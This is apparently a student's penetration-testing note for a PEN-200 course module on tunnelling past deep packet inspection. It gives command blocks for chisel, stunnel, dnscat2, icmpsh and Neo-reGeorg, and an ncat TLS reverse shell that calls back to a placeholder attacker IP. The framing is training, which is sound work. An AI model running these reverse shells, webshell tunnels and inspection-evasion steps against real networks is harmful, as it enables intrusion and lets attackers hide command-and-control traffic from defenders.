# Tunneling Through Deep Packet Inspection (PEN-200 Module 14)

When a network appliance (firewall, IDS/IPS, proxy) inspects traffic beyond port/protocol and blocks non-HTTP protocols even on allowed ports, standard tunnels fail. The solution: encapsulate your traffic inside a protocol the DPI device permits.

This file covers the *why* and *when* — for the base tunneling tools (chisel, ligolo-ng, SSH forwarding, etc.), see [`notes/pivoting-tunneling.md`](pivoting-tunneling.md).

## 1. When Standard Tunnels Fail

**Scenario:** You have a reverse shell on a host in a DMZ. Outbound traffic is only allowed on ports 80/443, and a DPI appliance inspects that traffic — raw TCP tunnels on port 443 get killed because the appliance sees they aren't real TLS/HTTP.

**Symptoms:**
- Chisel/ligolo connections on port 443 connect but immediately drop
- SSH tunnels on non-standard ports are blocked
- Reverse shells on port 80/443 die after the first few packets
- Only actual web browsing works from the compromised host

**Diagnosis:** If a tunnel works on an internal segment but fails when crossing a firewall boundary, suspect DPI. Test by running a simple HTTP request from the host (`curl http://your-server/test`) — if that works but your tunnel doesn't, DPI is filtering non-HTTP traffic on that port.

## 2. HTTP Tunneling with Chisel

Chisel already uses HTTP/WebSocket as its transport, making it one of the best tools for DPI evasion. The traffic looks like a legitimate WebSocket upgrade to HTTP-level inspection.

```bash
# Attacker (server) — listen on 80 to blend with HTTP traffic
chisel server --reverse --port 80

# Target (client) — connect out on port 80 via HTTP
chisel client <attacker_ip>:80 R:socks
```

**Why this works:** Chisel performs a real HTTP upgrade to WebSocket, then tunnels data over the WebSocket connection. Most DPI devices pass WebSocket traffic since it starts as valid HTTP.

**If WebSocket is also blocked:** use `--header "Host: allowed-domain.com"` to set an SNI/Host header that matches a whitelisted domain (domain fronting concept).

## 3. HTTPS Tunneling (TLS Wrapping)

Wrapping tunnel traffic in TLS makes it opaque to DPI — the appliance sees a TLS handshake and encrypted data, indistinguishable from normal HTTPS browsing.

### stunnel

stunnel wraps any TCP connection in TLS. Use it to protect a tunnel that would otherwise be detected.

```bash
# === Attacker side ===
# Generate a self-signed cert
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 30 -nodes -subj "/CN=webserver"

# stunnel config: accept TLS on 443, forward plain TCP to local listener
cat > /etc/stunnel/stunnel.conf << 'EOF'
[tunnel]
accept = 443
connect = 127.0.0.1:8080
cert = /path/to/cert.pem
key = /path/to/key.pem
EOF
stunnel /etc/stunnel/stunnel.conf

# Start your actual listener/tunnel server on 8080
# e.g., chisel server on 8080, or nc on 8080

# === Target side ===
# stunnel config: connect to attacker's TLS port, expose plain TCP locally
cat > /tmp/stunnel-client.conf << 'EOF'
[tunnel]
client = yes
accept = 127.0.0.1:9999
connect = <attacker_ip>:443
verify = 0
EOF
stunnel /tmp/stunnel-client.conf

# Now connect your tool to localhost:9999 — it exits the target as TLS on 443
chisel client 127.0.0.1:9999 R:socks
```

### ncat with --ssl

Quick TLS-wrapped reverse shell or port forward without stunnel setup:

```bash
# Attacker — TLS listener
ncat --ssl -nlvp 443

# Target — TLS-encrypted reverse shell
ncat --ssl <attacker_ip> 443 -e /bin/bash
```

## 4. DNS Tunneling

When only DNS (UDP 53) is allowed outbound. Extremely slow but works when nothing else does.

```bash
# Attacker — run dnscat2 server (requires you control a DNS zone)
# Set up an NS record pointing a subdomain to your server first
dnscat2-server tunnel.yourdomain.com

# Target — dnscat2 client
./dnscat2 tunnel.yourdomain.com

# In the dnscat2 server console:
windows                         # list sessions
window -i 1                     # interact with session
shell                           # get a shell
listen 127.0.0.1:9090 <internal_ip>:80   # port forward
```

**Also see:** `iodine` for IP-over-DNS tunneling (higher throughput than dnscat2 for SOCKS-style use).

For full dnscat2 and DNS tunneling syntax, see [`notes/pivoting-tunneling.md`](pivoting-tunneling.md) §DNS Tunneling.

## 5. ICMP Tunneling

When only ICMP (ping) is allowed. Even slower than DNS tunneling.

```bash
# Attacker
sudo python3 icmpsh_m.py <attacker_ip> <target_ip>

# Target (Windows — disable ping replies first)
icmpsh.exe -t <attacker_ip>
```

For full syntax, see [`notes/pivoting-tunneling.md`](pivoting-tunneling.md) §ICMP Tunneling.

## 6. Protocol Selection Decision Tree

```
Can you reach your attacker on ANY TCP port?
├── YES → Can raw TCP connections survive (no DPI)?
│   ├── YES → Use standard tunnel: chisel, ligolo-ng, SSH
│   │         (see pivoting-tunneling.md)
│   └── NO (DPI kills non-HTTP/TLS) →
│       ├── Port 443 open? → stunnel + your tunnel, or chisel (already HTTP-based)
│       ├── Port 80 open?  → chisel on port 80 (HTTP/WebSocket transport)
│       └── Other port?    → stunnel on that port wrapping your tunnel in TLS
│
└── NO TCP outbound →
    ├── DNS (UDP 53) allowed? → dnscat2 or iodine
    ├── ICMP allowed?         → icmpsh (very slow, last resort)
    └── Nothing allowed       → look for an egress path via a different host,
                                 or pivot through a web application (Neo-reGeorg webshell tunnel)
```

## 7. Neo-reGeorg (HTTP Webshell Tunnel)

When you have webshell access but no outbound connectivity from the web server — tunnel SOCKS through HTTP requests to an uploaded webshell.

```bash
# Generate the tunnel webshell (attacker)
python3 neoreg.py generate -k <password>

# Upload the appropriate webshell to the target:
# tunnel.aspx, tunnel.php, tunnel.jsp, etc.

# Connect through the webshell (attacker)
python3 neoreg.py -k <password> -u http://target/uploads/tunnel.php

# This creates a local SOCKS proxy (default 127.0.0.1:1080)
# Route tools through it:
proxychains nmap -sT -Pn <internal_target>
```

Full Neo-reGeorg syntax in [`notes/pivoting-tunneling.md`](pivoting-tunneling.md) §reGeorg / Neo-reGeorg.

## References

- PEN-200 Module 14: Tunneling Through Deep Packet Inspection
- https://github.com/jpillora/chisel
- https://www.stunnel.org
- https://github.com/iagox86/dnscat2
- See also: [`notes/pivoting-tunneling.md`](pivoting-tunneling.md) for base tunneling tool syntax
